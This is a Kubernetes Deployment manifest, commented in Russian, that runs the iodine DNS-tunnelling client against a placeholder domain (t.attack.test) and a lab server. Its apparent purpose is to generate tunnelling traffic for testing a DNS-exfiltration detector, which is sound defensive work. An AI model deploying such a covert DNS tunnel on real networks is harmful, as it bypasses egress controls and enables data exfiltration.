# Iodine client — IP-over-DNS. Генерирует трафик: HIGH_RATE, NULL_RECORD, MANY_ANSWERS.
#
# Сервер (iodined) работает в namespace attack-server (servers/deploy.sh iodine).
# Задать ATTACK_DOMAIN (по умолчанию t.attack.test) и задеплоить.
#
# Без сервера под будет падать/рестартить — для теста детектора достаточно,
# чтобы клиент периодически слал DNS-запросы (даже при неудачном подключении).
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: iodine-client
  namespace: attack
  labels:
    app: attack-traffic
    tool: iodine
spec:
  replicas: 1
  selector:
    matchLabels:
      app: attack-traffic
      tool: iodine
  template:
    metadata:
      labels:
        app: attack-traffic
        tool: iodine
    spec:
      containers:
        - name: iodine
          image: alpine:3.19
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache iodine
              NS="${ATTACK_NAMESERVER:-}"
              if [ -n "$NS" ]; then
                exec iodine -f -r -P "" "$ATTACK_DOMAIN" "$NS"
              else
                exec iodine -f -r -P "" "$ATTACK_DOMAIN"
              fi
          env:
            - name: ATTACK_DOMAIN
              value: "t.attack.test"
            - name: ATTACK_NAMESERVER
              value: ""
          securityContext:
            capabilities:
              add: ["NET_ADMIN"]
          volumeMounts:
            - name: tun
              mountPath: /dev/net/tun
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 200m
              memory: 128Mi
      volumes:
        - name: tun
          hostPath:
            path: /dev/net/tun
            type: CharDevice
      restartPolicy: Always
